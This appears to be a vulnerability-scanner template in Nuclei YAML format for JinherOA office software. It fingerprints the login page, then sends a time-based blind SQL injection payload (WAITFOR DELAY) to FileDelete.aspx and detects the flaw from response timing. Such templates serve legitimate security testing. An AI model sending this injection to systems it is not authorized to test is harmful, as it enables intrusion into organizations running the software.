id: poc-yaml-jinher-filedelete-aspx-sqli
info:
  name: JinherOA FileDelete.aspx SQL Injection Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection

variables:
  t1: "{{rand_int(2,5)}}"
  t2: "{{to_number(t1) + 2}}"

flow: http(1) && http(2)

http:
  - id: check-login-page
    method: GET
    path:
      - "{{BaseURL}}/C6/Jhsoft.Web.login/PassWordSlideFull.aspx"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "JHSoft"
        part: body

  - id: test-sqli
    method: POST
    path:
      - "{{BaseURL}}/c6/Jhsoft.Web.accept/FileDelete.aspx/"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: "SlaveID=-1')WAITFOR/**/DELAY'0:0:{{t1}}'--/Temp/"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - ""
        part: body
      - type: dsl
        dsl:
          - "duration > to_number(t1)"
          - "duration < to_number(t2)"
